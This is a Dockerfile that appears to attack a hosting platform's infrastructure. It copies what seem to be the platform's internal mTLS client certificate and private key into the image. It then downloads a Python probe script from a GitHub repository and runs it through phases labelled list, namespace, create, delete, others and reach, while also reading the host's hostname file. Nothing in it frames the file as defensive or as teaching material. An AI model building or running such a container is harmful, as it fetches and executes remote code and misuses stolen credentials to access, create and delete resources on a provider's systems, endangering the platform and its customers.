# MARK-I67987-VMR3-RT-b72d
FROM alpine:3.20
RUN echo MARK-I67987-VMR3-RT-b72d-apk && apk add --no-cache curl openssl python3 >/dev/null 2>&1 && echo APK_OK
COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
RUN echo MARK-I67987-VMR3-RT-b72d-dl && curl -sS -m 30 -o /p.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe_vmr3.py && wc -l /p.py
CMD ["sh","-c","echo RT_START $(date -u +%H:%M:%S); cat /host/etc/hostname 2>/dev/null; PHASE=list DEADLINE=200 timeout -s KILL 240 python3 /p.py 2>&1 | head -c 20000; echo ---RT-NS---; PHASE=ns DEADLINE=220 timeout -s KILL 260 python3 /p.py 2>&1 | head -c 20000; echo ---RT-CREATE---; PHASE=create DEADLINE=420 timeout -s KILL 460 python3 /p.py 2>&1 | head -c 26000; echo ---RT-DELETE---; PHASE=delete DEADLINE=300 timeout -s KILL 340 python3 /p.py 2>&1 | head -c 26000; echo ---RT-OTHERS---; PHASE=others DEADLINE=240 timeout -s KILL 280 python3 /p.py 2>&1 | head -c 20000; echo ---RT-REACH---; PHASE=reach DEADLINE=420 timeout -s KILL 460 python3 /p.py 2>&1 | head -c 26000; echo RT_END; sleep 3000"]
